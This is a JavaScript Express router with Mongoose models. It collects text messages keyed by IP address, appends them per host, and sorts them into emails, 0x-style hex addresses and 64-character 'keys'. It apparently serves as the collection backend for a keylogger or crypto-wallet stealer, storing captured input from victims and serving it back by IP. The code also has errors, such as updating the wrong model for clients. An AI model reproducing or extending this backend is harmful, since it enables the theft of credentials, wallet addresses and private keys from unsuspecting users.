const Normal = require('../models/normalModel.js');
const Expert = require('../models/expertModel.js');
const config = require('../config.js');
const Client = require('../models/clientModel.js');
const express = require('express');
let router = express.Router();
const insertNormal = (message, ipaddress) => {
    const filter = { ipaddress: ipaddress };
	// console.log(message);
    const options = {
        new: true, // Return the updated document instead of the original
        upsert: true // Make this update into an upsert operation
    };
    Normal.findOne(filter, (err, normal) => {
        if (!normal) {
             const newNormal = new Normal({
                ipaddress: ipaddress,
                message: message,
            })
            newNormal.save((err) => {
                if (err) throw err;
            });
            console.error("Error", err);
        } else {
            let new_message = normal.message + message;
            const update = {
                message: new_message,
            }
            Normal.findOneAndUpdate(filter, update, options, (err, doc) => {
                if (err) {
                    console.error('Error during update:', err);
                } else {
                    console.log('Updated doc:', doc);
                }
            });
        }
    })

}
const insertExpert = (message, ipaddress) => {
    let type = "normal";
	// console.log(message);
    const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/;
    const hexRegex = /\b0x[a-fA-F0-9]+\b/g;

    if (emailRegex.test(message)) {
        type = "email"
    } else if (hexRegex.test(message)) {
        type = "address"
    } else if(message.length == 64){
        type = "key"
    }
    const newExpert = new Expert({
        ipaddress: ipaddress,
        message: message,
        type: type,
    })
    newExpert.save((err) => {
        if (err) throw err;
    });
}
const insertClient = (recvname, ipaddress) => {
    const filter = { ipaddress: ipaddress };

    const options = {
        new: true, // Return the updated document instead of the original
        upsert: true // Make this update into an upsert operation
    };
    Client.findOne(filter, (err, client) => {
        if (!client) {
            const newClient = new Client({
                username: recvname,
                ipaddress: ipaddress,
            })
            newClient.save((err) => {
                if (err) throw err;
            });
        } else {
            let name = client.username + recvname;
            const update = {
                username: name,
            }
            Normal.findOneAndUpdate(filter, update, options, (err, doc) => {
                if (err) {
                    console.error('Error during update:', err);
                } else {
                    console.log('Updated Client:', doc);
                }
            });
        }
    })
}
router.get('/normal/:ipaddress', (req, res) => {
    const ipaddress = req.params.ipaddress;
    Normal.findOne({ ipaddress: ipaddress }, (err, normals) => {
        if (err) throw err;
        res.json( normals );
    })
});

router.get('/expert/:ipaddress', (req, res) => {
    const ipaddress = req.params.ipaddress;
    Expert.find({ ipaddress: ipaddress }, (err, experts) => {
        if (err) throw err;
        res.json( experts );
    }).sort({time: -1})
});

router.get('/client', (req, res) => {
    console.log("Need Client")
    Client.find({}).then((data) => { res.json(data) })
});
module.exports = { router, insertClient, insertExpert, insertNormal };